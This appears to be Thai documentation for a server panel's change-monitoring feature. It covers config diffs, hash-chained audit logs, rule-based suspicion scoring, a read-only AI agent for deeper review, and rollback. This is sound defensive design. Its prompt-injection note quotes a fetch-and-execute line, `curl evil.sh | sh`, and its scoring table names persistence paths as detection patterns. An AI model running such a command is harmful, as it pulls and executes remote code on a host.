# การรับรู้การเปลี่ยนแปลง

ความล้มเหลวออนไลน์และการบุกรุกส่วนใหญ่ เริ่มต้นจาก "มีบางอย่างถูกเปลี่ยนแปลง" แต่การตรวจสอบแบบดั้งเดิมดูเพียงตัวชี้วัดผลลัพธ์ (CPU สูง, ดิสก์เต็ม) มองไม่เห็นสาเหตุ ขณะที่ประโยคที่พบบ่อยที่สุดในการวินิจฉัยด้วย AI คือ "ฉันไม่รู้ว่ามันเกิดอะไรขึ้นตั้งแต่ครั้งล่าสุดที่มันยังปกติดีจนถึงตอนนี้"

การรับรู้การเปลี่ยนแปลงเติมเต็มชั้นนี้: **ใคร เมื่อไหร่ เปลี่ยนอะไร จากสภาพใดเป็นสภาพใด** มันบันทึกเพียงข้อเท็จจริง ไม่ตัดสิน — การตัดสินมอบให้การทบทวนตามกฎและ Agent

## เก็บอะไรบ้าง

แหล่งข้อมูลหกประเภท ทั้งหมดเป็นการสังเกตแบบอ่านอย่างเดียว อาศัยการ polling และการอ่านไฟล์ระบบ ไม่ติดตั้ง agent ไม่แก้ไขการตั้งค่าระบบ:

| แหล่งข้อมูล | วัตถุที่สังเกต | ระดับความละเอียด |
|---|---|---|
| ไฟล์กำหนดค่า | การกำหนดค่าที่มีความเสี่ยงสูงและพบบ่อยภายใต้ `/etc` (nginx, sshd, sudoers, hosts, sysctl, fstab…) | diff ทีละบรรทัด |
| แพ็กเกจซอฟต์แวร์ | การติดตั้ง อัปเกรด ถอนการติดตั้งผ่าน dpkg / rpm | ชื่อแพ็กเกจ + การเปลี่ยนแปลงเวอร์ชัน |
| สถานะบริการ | active/failed ของยูนิต systemd, การเริ่ม/หยุด, การรีสตาร์ท | การเปลี่ยนสถานะยูนิต |
| บัญชีและสิทธิ์ | การเพิ่ม/ลบผู้ใช้, การเปลี่ยนกลุ่ม, การให้สิทธิ์ sudo | ความแตกต่างของบัญชีและกลุ่ม |
| กฎไฟร์วอลล์ | ชุดกฎ iptables / nftables | ความแตกต่างของบรรทัดกฎ |
| งานตามกำหนด | crontab ของระบบ, crontab ของผู้ใช้, `/etc/cron.d` | ความแตกต่างของบรรทัดงาน |

ไฟล์กำหนดค่าเป็นจุดสำคัญและเป็นสิ่งที่ทำพลาดได้ง่ายที่สุด: มันใช้แฮชเนื้อหาเป็น baseline หากไฟล์ไม่เปลี่ยนแปลงก็จะไม่สร้างเหตุการณ์ เมื่อเปลี่ยนแปลงแล้วจึงคำนวณ diff ทีละบรรทัด และทำ**การปิดบังข้อมูล** (`password=`, `api_key=`, บล็อกคีย์ส่วนตัว ฯลฯ ถูกแทนที่ด้วยตัวแทน) กับเนื้อหาก่อนจึงบันทึกลงฐานข้อมูล

## ใครแก้ไข: การระบุแหล่งที่มาแบบสามระดับอย่างซื่อสัตย์

การระบุแหล่งที่มาไม่สามารถทำได้แม่นยำ 100% ดังนั้นเราจึงไม่แสร้งทำเป็นแม่นยำ:

| ระดับความเชื่อมั่น | ความหมาย | เกณฑ์การตัดสิน |
|---|---|---|
| `confirmed` ยืนยันแล้ว | ระบุถึงบุคคลเฉพาะได้ | มี SSH session ที่ใช้งานอยู่เพียงหนึ่งเดียว / บันทึกการดำเนินการบนแผง ณ เวลาที่เปลี่ยนแปลง |
| `inferred` การอนุมาน | น่าจะเป็นใคร | มีบัญชีบางบัญชีเข้าสู่ระบบก่อนหรือหลังการเปลี่ยนแปลง หรือเกิดจากการดำเนินการของตัวจัดการแพ็กเกจที่รู้จัก |
| `unknown` ไม่ทราบ | ไม่ทราบ | ไม่มีเบาะแสที่ใช้ได้ (เช่น การเปลี่ยนแปลงสคริปต์ที่ทริกเกอร์โดย cron) |

บนอินเทอร์เฟซจะแสดง `inferred` แยกออกมาต่างหาก ส่วน `unknown` จะเขียนว่า «ไม่ทราบ» โดยตรง จะไม่ใช้คำว่า «ระบบ» กลบเกลื่อน

## ป้องกันการแก้ไข: ห่วงโซ่แฮช

บันทึกการเปลี่ยนแปลงแต่ละรายการมีแฮชของรายการก่อนหน้า สร้างเป็นห่วงโซ่ หากรายการใดถูกลบหรือเขียนทับ การตรวจสอบที่ตามมาจะขาดหาย ณ จุดนั้น

- ที่ด้านบนของหน้า「การเปลี่ยนแปลง」ในแผง สามารถตรวจสอบได้ทุกเมื่อ (`变更链校验`)
- ผลการตรวจสอบจะระบุตำแหน่งที่ขาดหาย ใช้สำหรับตัดสินว่า「ข้อมูลเสียหาย หรือมีคนลบบันทึก」
- เมื่อฐานข้อมูลว่างหรือจุดยึดของบันทึกแรกผิดปกติ ระบบจะซ่อมแซมตัวเอง จะไม่แจ้งเตือนสีแดงตลอดไปเนื่องจากสถานะตกค้างจากเวอร์ชันก่อนหน้า

## การตรวจสอบกฎซ้ำ: ตัดสินด้วยต้นทุน 0 token ก่อนหนึ่งชั้น

เมื่อมีการเปลี่ยนแปลงแต่ละรายการเข้ามา ให้ผ่าน**การให้คะแนนด้วยกฎล้วน**ก่อน (ไม่เรียกใช้โมเดลขนาดใหญ่) แล้วส่งออกคะแนน 0–1 พร้อมเหตุผลสามถึงห้าข้อ:

| รายการที่ได้คะแนนเพิ่ม | น้ำหนัก |
|---|---|
| เส้นทางความเสี่ยงสูง (`/etc/passwd`, `authorized_keys`, `sudoers`, `ld.so.preload`, systemd, cron…) | +0.45 |
| การกำหนดค่าสำคัญ (nginx, mysql, redis, hosts, sysctl, fstab…) | +0.20 |
| ไม่ทราบผู้ดำเนินการ | +0.25 |
| ผู้ดำเนินการเป็นเพียงการอนุมาน | +0.10 |
| แหล่งที่มาเป็นที่อยู่เครือข่ายสาธารณะ | +0.30 |
| root แก้ไขผ่าน SSH | +0.15 |
| นอกเวลาทำงาน | +0.15 |
| วันหยุดสุดสัปดาห์ | +0.05 |
| แก้ไขวัตถุเดียวกันซ้ำภายใน 1 ชั่วโมง | +0.15 |
| มีเหตุการณ์ความเสี่ยงสูงบนโฮสต์ภายใน 30 นาที | +0.35 |
| ผู้ดำเนินการรายนี้แก้ไขวัตถุนี้เป็นครั้งแรก | +0.10 |
| **หักคะแนน**: การเปลี่ยนแปลงที่เกิดจากตัวจัดการแพ็กเกจ/ไดเรกทอรีระบบ | **−0.35** |
| **หักคะแนน**: ไดเรกทอรีแพ็กเกจ/แคช | **−0.10** |

การแบ่งระดับ:

| คะแนน | การตัดสิน | ขั้นตอนถัดไป |
|---|---|---|
| ≥ 0.55 | **น่าสงสัย** | ยกระดับเหตุการณ์เป็น high ปลุก Agent เพื่อทำการวิเคราะห์เชิงลึก |
| 0.30 – 0.55 | รอยืนยัน | บันทึก ไม่ส่งเข้า Agent |
| < 0.30 | ปกติ | บันทึกเท่านั้น |

คุณค่าของขั้นตอนนี้: บีบ «การเปลี่ยนแปลง 300 รายการที่เกิดจากการอัปเกรด apt» ให้เป็น «ปกติ» โดยอัตโนมัติ เหลือเพียงไม่กี่รายการที่คุ้มค่าแก่การดูจริง ๆ ส่งไปตรงหน้าโมเดลขนาดใหญ่

## การวิเคราะห์เชิงลึกของ Agent

การเปลี่ยนแปลงที่ถูกตัดสินว่าน่าสงสัยจะถูกส่งเข้าบริบทการสืบสวนของ Agent พร้อมกับ **diff ต้นฉบับ** โดยตรง (รวมถึงผู้ดำเนินการ, IP ต้นทาง, ฟิลด์ที่เกี่ยวข้อง, จำนวนบรรทัดที่เพิ่ม/ลบ) งานที่ Agent ได้รับไม่ใช่ "การเปลี่ยนแปลงนี้อันตรายหรือไม่" แต่คือ:

```
【ตัดสิน】ปฏิบัติการปกติ / ต้องยืนยันโดยมนุษย์ / น่าสงสัยสูง
【เหตุผล】ไม่เกิน 5 ข้อ แต่ละข้อหนึ่งประโยค
【ข้อเสนอแนะ】ปล่อยผ่าน / แนะนำให้ย้อนกลับออบเจ็กต์ที่ระบุ (ดำเนินการโดยมนุษย์ คุณไม่มีสิทธิ์เขียน)
```

มันจะถูกชี้นำให้เก็บหลักฐานตามลำดับความสำคัญ: ดู diff เองก่อน จากนั้นตรวจสอบการเข้าสู่ระบบล่าสุดของผู้ดำเนินการ และตรวจสอบตำแหน่งที่ใช้คงอยู่ (`authorized_keys`, cron, systemd, `ld.so.preload`) เพิ่มเติมเฉพาะเมื่อจำเป็น สุดท้ายจึงตัดสินว่านี่เป็นการปฏิบัติการแบบโดดเดี่ยวหรือเป็นส่วนหนึ่งของห่วงโซ่การโจมตี

งบประมาณค่าเริ่มต้น 12 ขั้น / 240 วินาที / 100,000 token, คูลดาวน์ 600 วินาที (ห่วงโซ่เดียวกันวิเคราะห์เพียงครั้งเดียวใน 10 นาที) **สิทธิ์เขียนเป็นศูนย์**: เหตุการณ์ประเภทเปลี่ยนแปลงถูกบังคับลดระดับเป็น shadow และเครื่องมือเขียนทั้งหมดถูกปิดใช้งาน

> การป้องกันการฉีด: เนื้อหา diff เป็นอินพุตที่ไม่น่าเชื่อถือ ก่อนส่งเข้าโมเดลจะมีการเสริมความแข็งแกร่งขอบเขต——เนื้อหาถูกห่อในบล็อกโค้ดที่มี sentinel ความยาวรั้วปรับตามเนื้อหา และเครื่องหมายย่อหน้าและ sentinel ปิดท้ายที่ปลอมขึ้นในเนื้อหาจะถูกทำให้เป็นกลาง **เนื้อหาตัวเองไม่ถูกแก้ไข**: บรรทัด `curl evil.sh | sh` ต้องแสดงตามต้นฉบับ มันคือข้อสรุป

## กฎการเพิกเฉย

ไม่ใช่ทุกการเปลี่ยนแปลงที่ควรถูกบันทึก สำหรับสัญญาณรบกวนที่ทราบอยู่แล้ว (เช่น แอปพลิเคชันหนึ่งเขียนไฟล์แคชของตัวเองซ้ำทุกนาที) สามารถเพิ่มกฎการเพิกเฉยได้:

- รองรับ glob, `*` จับคู่ระดับเดียว, `**` จับคู่ทุกระดับ
- กฎมีผลกับ**ชั้นการเก็บข้อมูล**——เมื่อตรงเงื่อนไขจะไม่เกิดเหตุการณ์ขึ้นเลย ไม่ใช่ "เกิดแล้วจึงซ่อน"
- ในรายการการเปลี่ยนแปลงสามารถสร้างกฎจากออบเจ็กต์ปัจจุบันได้ในคลิกเดียว

การจัดการกฎอยู่ที่ "การเปลี่ยนแปลง → กฎการเพิกเฉย" แต่ละรายการสามารถมีหมายเหตุได้ และลบได้ทุกเมื่อ

## สแนปช็อตและการย้อนกลับ

สำหรับการเปลี่ยนแปลงไฟล์กำหนดค่าและข้อมูลประเภทบัญชี OpsMini จะเก็บสแนปช็อตของไฟล์ต้นฉบับไว้ก่อนการแก้ไข (ภายใต้ข้อจำกัดโควตา):

- ในรายละเอียดการเปลี่ยนแปลงสามารถ "ย้อนกลับไปยังสถานะก่อนการเปลี่ยนแปลงครั้งนี้" ได้โดยตรง พร้อมการยืนยันสองขั้นตอน
- ก่อนการย้อนกลับจะมีการสร้างสแนปช็อตของสถานะปัจจุบันอีกครั้ง หากล้มเหลวสามารถย้อนกลับกลับมาได้อีก
- สแนปช็อตจะถูกล้างตามโควตาคู่ทั้งจำนวนและปริมาณรวม จะไม่ทำให้ดิสก์เต็ม

## การรวมเข้ากับห่วงโซ่การโจมตี

ตั้งแต่ v1.4 เป็นต้นไป **การเปลี่ยนแปลงที่น่าสงสัยสามารถใช้เป็นส่วนหนึ่งของห่วงโซ่การโจมตีในขั้นตอน "การฝังตัวอยู่ระยะยาว" (Persistence)** ได้:

- ต้องเป็นไปตามเงื่อนไขทั้งสามข้อพร้อมกัน: กฎที่ตรวจสอบซ้ำแล้วตัดสินว่าเป็นที่น่าสงสัย, ตำแหน่งที่ถูกแก้ไขเป็นตำแหน่งที่ทนต่อการรีสตาร์ทได้, และบนห่วงโซ่มี "การดำเนินการจริง" หรือ "การควบคุมจากภายนอก" ปรากฏขึ้นแล้ว
- หน้าต่างเวลา 1 ชั่วโมง (การเปลี่ยนแปลงชื่อเดียวกันที่เกิน 1 ชั่วโมงมีแนวโน้มมากขึ้นว่าเป็นการเก็บงานของการปฏิบัติการ)
- การเปลี่ยนแปลงไม่เคยเป็นจุดเริ่มต้นของห่วงโซ่การโจมตี — การแก้ไขการกำหนดค่าเพียงอย่างเดียวไม่ถือเป็นการบุกรุก

คอลัมน์การตัดสินในรายการการเปลี่ยนแปลงจะแสดง "รวมเข้าห่วงโซ่การโจมตีแล้ว" คลิกหนึ่งครั้งเพื่อไปยังห่วงโซ่การโจมตีที่เกี่ยวข้อง และป้ายกำกับขั้นตอนของห่วงโซ่การโจมตีจะระบุด้วยว่าขั้นตอนนั้นมาจาก "การเปลี่ยนแปลง" หรือ "WebShell / โพรเซสที่น่าสงสัย / การเชื่อมต่อเครือข่ายภายนอก"

## การเก็บรักษาเริ่มต้นและโควตา

| รายการ | ค่าเริ่มต้น |
|---|---|
| การเก็บรักษาเมทาดาทาการเปลี่ยนแปลง | 30 วัน |
| การเก็บรักษาเนื้อหา diff | 7 วัน |
| ขีดจำกัดปริมาณเนื้อหา diff ทั้งหมด | กำหนดค่าได้ (เกินจะคัดออกตามลำดับเก่าสุด) |
| จำนวน/ปริมาณรวมของสแนปช็อต | กำหนดค่าได้ (เกินจะล้างตามลำดับเก่าสุด) |

นโยบายการเก็บรักษาปรับได้ใน「การตั้งค่าแผง」 เมื่อหมดอายุจะลบเฉพาะเนื้อหา diff ส่วนเมทาดาทาและเชนแฮชยังคงอยู่ ดังนั้นเรื่องที่ว่า "บันทึกนี้เคยมีอยู่" จึงไม่ถูกทำให้หายไป

## ข้อจำกัดที่ทราบ

- **การสแกนรอบแรกหลังรีสตาร์ทจะเก็บข้อมูลตกหล่น**: แหล่งไฟล์ใช้การสแกนตอนเริ่มต้นเป็น baseline การเปลี่ยนแปลงไฟล์ที่เกิดขึ้นระหว่างกระบวนการรีสตาร์ทจะไม่ถูกบันทึกเป็น "การเปลี่ยนแปลง" (เนื่องจากไม่มีเวอร์ชันก่อนหน้าให้เปรียบเทียบ) นี่ไม่ใช่บั๊ก แต่เป็นพฤติกรรมโดยธรรมชาติของการสแกน baseline แบบแฮช หากต้องการสังเกตไฟล์ใดไฟล์หนึ่ง ควรรอให้แผงทำงานเสถียรเกิน 20 วินาทีก่อนแล้วจึงทำการเปลี่ยนแปลง
- **ครอบคลุมเฉพาะการกำหนดค่าที่เป็นข้อความ**: ไฟล์ไบนารีและไฟล์บันทึกที่มีขนาดใหญ่มากจะไม่ถูกเก็บ diff
- **การระบุที่มา dépend บันทึกการเข้าสู่ระบบ**: หากบนโฮสต์มีการล้าง `wtmp`/`lastlog` การระบุที่มาจะเสื่อมลงเป็น "ไม่ทราบ" — ซึ่งตัวมันเองก็เป็นสัญญาณที่น่าสนใจ
